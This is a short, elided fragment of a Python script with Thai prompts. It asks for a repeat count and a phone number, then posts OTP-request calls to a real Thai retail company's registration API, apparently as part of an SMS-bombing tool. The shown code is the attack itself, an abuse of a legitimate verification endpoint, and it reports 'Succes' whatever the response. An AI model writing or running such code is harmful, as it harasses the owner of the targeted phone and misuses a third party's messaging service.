...
num = int(input("จำนวน : "))
print("")
print("________________________waiting__________________________")
...
def API_17():
	try:
		jun=('phone')
		req = requests.post("https://the1web-api.the1.co.th/api/t1p/regis/requestOTP", json={"on":{"value":phone,"country":"66"},"type":"mobile"})
		if str(jun) in str(req.text):
			print("\033[92m Succes")
		else:
			print("\033[92m Succes")
